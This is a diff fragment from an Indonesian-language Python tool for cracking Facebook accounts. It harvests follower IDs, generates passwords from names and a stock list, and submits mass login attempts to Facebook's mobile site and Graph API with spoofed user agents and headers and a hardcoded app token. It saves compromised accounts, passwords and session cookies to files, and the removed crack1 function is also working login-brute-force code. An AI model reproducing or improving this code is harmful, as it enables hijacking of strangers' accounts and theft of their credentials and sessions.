 	Console().print(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",subtitle="╭───", subtitle_align="left",width=80,padding=(0,7),style=f"bold cyan"))
-	user = Console().input("[bold cyan]   ╰─>[bold red] Masukan Id : ")
+	user = Console().input("[bold cyan]   ╰─> Masukan Id : ")
 	if user.isdigit():
 		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
 	else:
@@ -1374,7 +1027,7 @@ def passwrd():
 			for yuzong in id2:
 				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(" ")[0]
-				pwv = ['anjing123','sayangku','maling123','sayang123','malang123','bismillah123']
+				pwv = ['anjing123','bangsad123','sayangku','maling123','sayang123','malang123','bismillah123']
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
@@ -1458,6 +1111,7 @@ def reguler(idf,pwv,awal):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
+				print('\n')
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
@@ -1470,6 +1124,7 @@ def reguler(idf,pwv,awal):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print('\n')
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
@@ -1551,44 +1206,7 @@ def _async(idf,pwv):
 		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
 
-def crack1(idf,pwv,awal):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	#ua = useragent()
-	#ua = random.choice(ugen2)
-	ses = requests.Session()
-	ahir = str(datetime.now()-awal).split('.')[0]
-	prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
-	prog.advance(des) 
-	for pw in pwv:
-		try:
-			#gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
-			ua = random.choice(free) 
-			data = {"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "sdk_version": {random.randint(1,26)}, "email": idf, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
-			head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json() 
-			#anjg = json.loads(xnxx.text)
-			#cuaks=(f'{idf}|{pw)
-			if "session_key" in xnxx:
-				cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
-				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-				coki = f"sb={ssbb};{cokz}"
-				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				break
-			elif "www.facebook.com" in xnxx["error"]["message"]:
-				print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
-				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				break
-			elif "Calls to this api have exceeded the rate limit. (613)" in xnxx:
-				prog.update(des,description=f"[bold white][[bold yellow]{ahir}[bold white]]-[[bold white]{loop}[bold yellow]/[bold white]{len(id)}[bold white]]-[[bold green]OK-:[bold green]{ok}[/] {k}CP-:[bold yellow]{cp}[bold white]][/]")
-				prog.advence(des) 
-				time.sleep(5) 
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
+
 	
 
 
